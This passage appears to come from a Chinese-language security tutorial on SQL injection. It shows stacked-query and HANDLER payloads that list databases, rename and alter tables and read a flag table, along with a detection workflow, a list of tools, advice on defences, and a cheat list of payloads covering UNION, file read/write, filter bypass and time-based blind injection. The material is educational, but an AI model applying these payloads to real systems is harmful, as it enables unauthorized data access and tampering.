+<h1 id="七accessmdb与堆叠注入">七、Access（MDB）与堆叠注入</h1>
+<h2 id="access-数据库asp--mdb">Access 数据库（ASP + MDB）</h2>
+<ul>
+<li>无标准用户体系，用 <code>sqlmap</code> 字典爆破可能不稳定；</li>
+<li>若知道表名/列名，直接用查询；若未知则需枚举或人工分析。</li>
+</ul>
+<h2 id="堆叠注入stacked-queries">堆叠注入（Stacked Queries）</h2>
+<ul>
+<li>MySQL 支持多语句（视驱动而定），可以使用 <code>;</code> 执行多条语句（例如：<code>SHOW DATABASES;</code>）。</li>
+<li>示例用法（查看/修改表结构）：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 查看所有数据库
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; SHOW DATABASES; --
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-- 通过 rename / alter 做表改名或新增列（需足够权限）
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span>; <span style="color:#66d9ef">RENAME</span> <span style="color:#66d9ef">TABLE</span> words <span style="color:#66d9ef">TO</span> BaiMao; <span style="color:#66d9ef">ALTER</span> <span style="color:#66d9ef">TABLE</span> words <span style="color:#66d9ef">ADD</span> id INT UNSIGNED <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span>; <span style="color:#66d9ef">ALTER</span> <span style="color:#66d9ef">TABLE</span> words CHANGE flag <span style="color:#66d9ef">data</span> VARCHAR(<span style="color:#ae81ff">100</span>);<span style="color:#f92672">#</span>
+</span></span></code></pre></div><p><strong>注意</strong>：堆叠注入在很多现代框架/驱动中被禁用或受限。</p>
+<hr>
+<h1 id="八读取技巧handler替代-select">八、读取技巧：HANDLER（替代 SELECT）</h1>
+<p><code>HANDLER</code> 操作常用于低级读取，示例：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span>; <span style="color:#66d9ef">HANDLER</span> FlagHere <span style="color:#66d9ef">OPEN</span>; <span style="color:#66d9ef">HANDLER</span> FlagHere <span style="color:#66d9ef">READ</span> <span style="color:#66d9ef">NEXT</span>; <span style="color:#66d9ef">HANDLER</span> FlagHere <span style="color:#66d9ef">CLOSE</span>;
+</span></span></code></pre></div><p>用于逐行读取表数据（在某些环境下比 <code>SELECT</code> 更易成功）。</p>
+<hr>
+<h1 id="九常用工具与检测流程">九、常用工具与检测流程</h1>
+<ul>
+<li>
+<p><strong>工具</strong>：<code>sqlmap</code>、<code>Burp Suite</code>、<code>sqlninja</code>（针对 MSSQL）、<code>nmap --script</code>（发现 web 漏洞）等。</p>
+</li>
+<li>
+<p><strong>检测流程（典型）</strong>：</p>
+<ol>
+<li>参数注入点识别（GET/POST/头部/COOKIE）；</li>
+<li>列数探测（<code>ORDER BY</code>）与回显列定位（<code>UNION SELECT</code>）；</li>
+<li>信息枚举（<code>version()</code>、<code>user()</code>、<code>database()</code>）；</li>
+<li>枚举 <code>information_schema</code>（表/列）；</li>
+<li>数据提取（<code>LIMIT</code> 分页）或盲注（布尔/时间）;</li>
+<li>横向扩展（跨库/文件读写）——视权限而定。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h1 id="十防护">十、防护</h1>
+<ul>
+<li>使用参数化查询（Prepared Statements）或 ORM，避免字符串拼接 SQL；</li>
+<li>对用户输入进行严格校验与最小化权限原则（数据库用户只赋予必要权限）；</li>
+<li>关闭或限制 <code>LOAD_FILE</code> / <code>INTO OUTFILE</code> 权限；设置合理的 <code>secure-file-priv</code>；</li>
+<li>数据库用户不使用 <code>root</code>：不同服务使用不同低权限用户；</li>
+<li>开启 Web 应用 WAF 与异常日志告警，定期审计 SQL 日志；</li>
+<li>对错误信息进行脱敏，避免泄露路径与 SQL 错误栈。</li>
+</ul>
+<hr>
+<h1 id="附常见-payload">附：常见 payload</h1>
+<ul>
+<li><code>ORDER BY n</code>：探测列数</li>
+<li><code>UNION SELECT ...</code>：回显型注入</li>
+<li><code>LOAD_FILE(...)</code>, <code>INTO OUTFILE 'path'</code>：文件读写</li>
+<li>十六进制编码 + <code>PREPARE/EXECUTE</code>：绕过过滤</li>
+<li>布尔/时间盲注：<code>IF(condition, SLEEP(5), NULL)</code></li>
+</ul>
+<hr>
+<h1 id="参考">参考</h1>
+<ul>
+<li>OWASP SQL Injection Cheat Sheet</li>
+<li>sqlmap 文档与使用手册</li>
+<li>MySQL 官方文档（<code>information_schema</code>）</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up1/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>文件上传：解析、存储与安全最佳实践</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/app/app2/"><span>APP 抓包问题与证书/代理/模拟器防护与绕过</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
